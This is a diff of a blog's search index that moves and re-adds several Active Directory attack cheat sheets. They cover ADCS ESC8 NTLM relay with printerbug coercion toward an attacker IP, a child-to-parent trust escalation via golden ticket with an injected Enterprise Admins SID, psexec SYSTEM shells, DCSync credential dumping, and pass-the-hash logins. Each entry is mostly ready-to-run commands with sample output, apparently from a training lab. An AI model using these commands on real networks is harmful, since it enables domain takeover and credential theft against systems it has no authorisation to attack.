@@ -1,6 +1,112 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ADCS : ESC8</title>
+    <url>/2025/11/30/ADCS-ESC8/</url>
+    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
+
+<p>Enumerate ADCS over SMB</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
+
+<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
+<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Or </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>ADCS</category>
+      </categories>
+      <tags>
+        <tag>ESC8</tag>
+        <tag>Certipy</tag>
+        <tag>impacket-ntlmrelayx</tag>
+        <tag>printerbug</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Attacking Child-Parent Trust From Linux</title>
+    <url>/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/</url>
+    <content><![CDATA[<blockquote>
+<p>Attacking Domain Trusts – Child → Parent Trusts relies on manipulating the <code>SID History attribute</code> to add a high-privilege group SID, allowing an attacker in the child domain to escalate privileges and access the parent domain as <code>SYSTEM</code>.</p>
+</blockquote>
+<h1 id="Manually"><a href="#Manually" class="headerlink" title="Manually"></a>Manually</h1><h3 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h3><blockquote>
+<p>To successfully get access to the parent domain we need first : </p>
+<ul>
+<li>The KRBTGT hash of the child domain ( To Sign the Golden Ticket ).</li>
+<li>The SID of the child domain.</li>
+<li>The FQDN of the child domain.</li>
+<li>The name of a target user in the child domain (doesn’t need to exist!).</li>
+<li>The SID of the Enterprise Admins Group of the parent domain.</li>
+</ul>
+</blockquote>
+<h3 id="Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain"><a href="#Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain" class="headerlink" title="Extraction Of KRBTGT Hash Of The Child Domain"></a>Extraction Of KRBTGT Hash Of The Child Domain</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py child-FQDN-domain/our-privileged-user@child-domain-dc-ip -just-dc-user NETBIOS_DOMAIN/krbtgt</span><br><span class="line"></span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br></pre></td></tr></table></figure>
+
+
+<p>FQDN : <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
+<p>krbtgt : <code>9d765b482771505cbe97411065964d5f</code>.</p>
+<h3 id="Extracting-Child-Domain-SID"><a href="#Extracting-Child-Domain-SID" class="headerlink" title="Extracting Child Domain SID"></a>Extracting Child Domain SID</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lookupsid.py child-FQDN-domain/our-privileged-user@child-dc-ip | grep <span class="string">&quot;Domain SID&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Extracting-Parent-Domain-SID-Attaching-to-Enterprise-Admins’s-RID"><a href="#Extracting-Parent-Domain-SID-Attaching-to-Enterprise-Admins’s-RID" class="headerlink" title="Extracting Parent Domain SID &amp; Attaching to Enterprise Admins’s RID"></a>Extracting Parent Domain SID &amp; Attaching to Enterprise Admins’s RID</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lookupsid.py child-FQDN-domain/our-privileged-user@parent-dc-ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114</span><br><span class="line"></span><br><span class="line">519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ <code>Enterprise-Admins-SID</code> : S-1-5-21-3842939050-3880317879-2865463114-519</p>
+</blockquote>
+<h3 id="Craft-A-Golden-Ticket"><a href="#Craft-A-Golden-Ticket" class="headerlink" title="Craft A Golden Ticket"></a>Craft A Golden Ticket</h3><blockquote>
+<p>➜ With this command, we craft a golden ticket for <code>non existing user ( twistzz )</code> and inject in the <code>SID History</code> attribute the SID of the <code>Enterprise Admins</code> Group.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ticketer.py -nthash KRBTGT-<span class="built_in">hash</span> -domain child-domain-FQDN -domain-sid child-domain-SID -extra-sid Enterprise-Admins-SID twistzz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> twistzz.ccache</span><br></pre></td></tr></table></figure>
+
+<h3 id="Getting-a-SYSTEM-Shell"><a href="#Getting-a-SYSTEM-Shell" class="headerlink" title="Getting a SYSTEM Shell"></a>Getting a SYSTEM Shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=twistzz.ccache </span><br><span class="line"></span><br><span class="line">psexec.py child-FQDN-domain/twistzz@dc.parent-FQDN-domain -k -no-pass -target-ip parent-dc-ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="DCSync-The-Parent-Domain"><a href="#DCSync-The-Parent-Domain" class="headerlink" title="DCSync The Parent Domain"></a>DCSync The Parent Domain</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py twistzz@dc.parent-FQDN-domain -k -no-pass -just-dc-ntlm -just-dc-user Administrator</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Automatically"><a href="#Automatically" class="headerlink" title="Automatically"></a>Automatically</h1><h3 id="raiseChild"><a href="#raiseChild" class="headerlink" title="raiseChild"></a>raiseChild</h3><blockquote>
+<p>We <code>need to specify the target domain controller</code> and <code>credentials for an administrative user in the child domain</code>, the script will do the rest :</p>
+<ul>
+<li>Obtains the SID for the Enterprise Admins group of the parent domain</li>
+<li>Retrieves the hash for the KRBTGT account in the child domain</li>
+<li>Creates a Golden Ticket</li>
+<li>Logs into the parent domain</li>
+<li>Retrieves credentials for the Administrator account in the parent domain</li>
+</ul>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">raiseChild.py -target-exec Parent-DC-IP Child-domain/our-privileged-user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>Domain Trusts</category>
+        <category>Abuse Child-Parent Trust From Linux</category>
+      </categories>
+      <tags>
+        <tag>secretsdump</tag>
+        <tag>lookupsid</tag>
+        <tag>ticketer</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AD : ACLs</title>
     <url>/2025/12/02/AD-ACLs/</url>
     <content><![CDATA[<h1 id="ForceChangePassword"><a href="#ForceChangePassword" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h1><blockquote>
@@ -149,57 +255,14 @@
         <category>ACLs</category>
       </categories>
       <tags>
-        <tag>netexec</tag>
         <tag>Certipy</tag>
+        <tag>secretsdump</tag>
+        <tag>netexec</tag>
         <tag>dacledit</tag>
         <tag>owneredit</tag>
         <tag>bloodyAD</tag>
-        <tag>secretsdump</tag>
         <tag>PowerView</tag>
         <tag>net</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ADCS : ESC8</title>
-    <url>/2025/11/30/ADCS-ESC8/</url>
-    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
-
-<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
-
-<p>Enumerate ADCS over SMB</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
-
-<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
-<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Or </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>ADCS</category>
-      </categories>
-      <tags>
-        <tag>Certipy</tag>
-        <tag>ESC8</tag>
-        <tag>impacket-ntlmrelayx</tag>
-        <tag>printerbug</tag>
       </tags>
   </entry>
   <entry>
@@ -264,69 +327,6 @@
         <tag>PowerView</tag>
         <tag>Mimikatz</tag>
         <tag>Rubeus</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Attacking Child-Parent Trust From Linux</title>
-    <url>/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/</url>
-    <content><![CDATA[<blockquote>
-<p>Attacking Domain Trusts – Child → Parent Trusts relies on manipulating the <code>SID History attribute</code> to add a high-privilege group SID, allowing an attacker in the child domain to escalate privileges and access the parent domain as <code>SYSTEM</code>.</p>
-</blockquote>
-<h1 id="Manually"><a href="#Manually" class="headerlink" title="Manually"></a>Manually</h1><h3 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h3><blockquote>
-<p>To successfully get access to the parent domain we need first : </p>
-<ul>
-<li>The KRBTGT hash of the child domain ( To Sign the Golden Ticket ).</li>
-<li>The SID of the child domain.</li>
-<li>The FQDN of the child domain.</li>
-<li>The name of a target user in the child domain (doesn’t need to exist!).</li>
-<li>The SID of the Enterprise Admins Group of the parent domain.</li>
-</ul>
-</blockquote>
-<h3 id="Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain"><a href="#Extraction-Of-KRBTGT-Hash-Of-The-Child-Domain" class="headerlink" title="Extraction Of KRBTGT Hash Of The Child Domain"></a>Extraction Of KRBTGT Hash Of The Child Domain</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py child-FQDN-domain/our-privileged-user@child-domain-dc-ip -just-dc-user NETBIOS_DOMAIN/krbtgt</span><br><span class="line"></span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::</span><br></pre></td></tr></table></figure>
-
-
-<p>FQDN : <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
-<p>krbtgt : <code>9d765b482771505cbe97411065964d5f</code>.</p>
-<h3 id="Extracting-Child-Domain-SID"><a href="#Extracting-Child-Domain-SID" class="headerlink" title="Extracting Child Domain SID"></a>Extracting Child Domain SID</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lookupsid.py child-FQDN-domain/our-privileged-user@child-dc-ip | grep <span class="string">&quot;Domain SID&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Extracting-Parent-Domain-SID-Attaching-to-Enterprise-Admins’s-RID"><a href="#Extracting-Parent-Domain-SID-Attaching-to-Enterprise-Admins’s-RID" class="headerlink" title="Extracting Parent Domain SID &amp; Attaching to Enterprise Admins’s RID"></a>Extracting Parent Domain SID &amp; Attaching to Enterprise Admins’s RID</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lookupsid.py child-FQDN-domain/our-privileged-user@parent-dc-ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114</span><br><span class="line"></span><br><span class="line">519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ <code>Enterprise-Admins-SID</code> : S-1-5-21-3842939050-3880317879-2865463114-519</p>
-</blockquote>
-<h3 id="Craft-A-Golden-Ticket"><a href="#Craft-A-Golden-Ticket" class="headerlink" title="Craft A Golden Ticket"></a>Craft A Golden Ticket</h3><blockquote>
-<p>➜ With this command, we craft a golden ticket for <code>non existing user ( twistzz )</code> and inject in the <code>SID History</code> attribute the SID of the <code>Enterprise Admins</code> Group.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ticketer.py -nthash KRBTGT-<span class="built_in">hash</span> -domain child-domain-FQDN -domain-sid child-domain-SID -extra-sid Enterprise-Admins-SID twistzz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> twistzz.ccache</span><br></pre></td></tr></table></figure>
-
-<h3 id="Getting-a-SYSTEM-Shell"><a href="#Getting-a-SYSTEM-Shell" class="headerlink" title="Getting a SYSTEM Shell"></a>Getting a SYSTEM Shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=twistzz.ccache </span><br><span class="line"></span><br><span class="line">psexec.py child-FQDN-domain/twistzz@dc.parent-FQDN-domain -k -no-pass -target-ip parent-dc-ip</span><br></pre></td></tr></table></figure>
-
-<h3 id="DCSync-The-Parent-Domain"><a href="#DCSync-The-Parent-Domain" class="headerlink" title="DCSync The Parent Domain"></a>DCSync The Parent Domain</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py twistzz@dc.parent-FQDN-domain -k -no-pass -just-dc-ntlm -just-dc-user Administrator</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Automatically"><a href="#Automatically" class="headerlink" title="Automatically"></a>Automatically</h1><h3 id="raiseChild"><a href="#raiseChild" class="headerlink" title="raiseChild"></a>raiseChild</h3><blockquote>
-<p>We <code>need to specify the target domain controller</code> and <code>credentials for an administrative user in the child domain</code>, the script will do the rest :</p>
-<ul>
-<li>Obtains the SID for the Enterprise Admins group of the parent domain</li>
-<li>Retrieves the hash for the KRBTGT account in the child domain</li>
-<li>Creates a Golden Ticket</li>
-<li>Logs into the parent domain</li>
-<li>Retrieves credentials for the Administrator account in the parent domain</li>
-</ul>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">raiseChild.py -target-exec Parent-DC-IP Child-domain/our-privileged-user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>Domain Trusts</category>
-        <category>Abuse Child-Parent Trust From Linux</category>
-      </categories>
-      <tags>
-        <tag>secretsdump</tag>
-        <tag>lookupsid</tag>
-        <tag>ticketer</tag>
       </tags>
   </entry>
   <entry>
@@ -667,6 +667,37 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux Pass the Hash (PtH)</title>
+    <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
+    <content><![CDATA[<h1 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h1><h3 id="Domain-Account"><a href="#Domain-Account" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -d Domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Local-Account"><a href="#Local-Account" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span> --local-auth</span><br></pre></td></tr></table></figure>
+
+<h3 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span>  -x <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h1><h3 id="Local-Account-1"><a href="#Local-Account-1" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Domain-Account-1"><a href="#Domain-Account-1" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username@domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-psexec username@ip -hashes :<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp  /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Pass the Hash (PtH)</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>evil-winrm</tag>
+        <tag>impacket-psexec</tag>
+        <tag>xfreerdp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Making a Target User List</title>
     <url>/2025/12/03/Making-a-Target-User-List/</url>
     <content><![CDATA[<h2 id="SMB-NULL-Session"><a href="#SMB-NULL-Session" class="headerlink" title="SMB NULL Session"></a>SMB NULL Session</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc dc-ip -d Domain wordlist.txt</span><br></pre></td></tr></table></figure>
@@ -863,6 +894,7 @@
 ]]></content>
       <categories>
         <category>Active Directory</category>
+        <category>Enumeration</category>
         <category>Service-Enumeration</category>
         <category>MySQL</category>
       </categories>
@@ -909,37 +941,6 @@
         <tag>Exploitation</tag>
         <tag>MySQL-Read-Files</tag>
         <tag>MySQL-Write-Files</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux Pass the Hash (PtH)</title>
-    <url>/2025/11/27/Linux-Pass-the-Hash-PtH/</url>
-    <content><![CDATA[<h1 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h1><h3 id="Domain-Account"><a href="#Domain-Account" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -d Domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Local-Account"><a href="#Local-Account" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span> --local-auth</span><br></pre></td></tr></table></figure>
-
-<h3 id="Command-Execution"><a href="#Command-Execution" class="headerlink" title="Command Execution"></a>Command Execution</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb ip -u username -H <span class="built_in">hash</span>  -x <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h1><h3 id="Local-Account-1"><a href="#Local-Account-1" class="headerlink" title="Local Account"></a>Local Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Domain-Account-1"><a href="#Domain-Account-1" class="headerlink" title="Domain Account"></a>Domain Account</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i ip -u username@domain -H <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-psexec username@ip -hashes :<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp  /v:ip /u:username /pth:<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Pass the Hash (PtH)</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>evil-winrm</tag>
-        <tag>impacket-psexec</tag>
-        <tag>xfreerdp</tag>
       </tags>
   </entry>
   <entry>
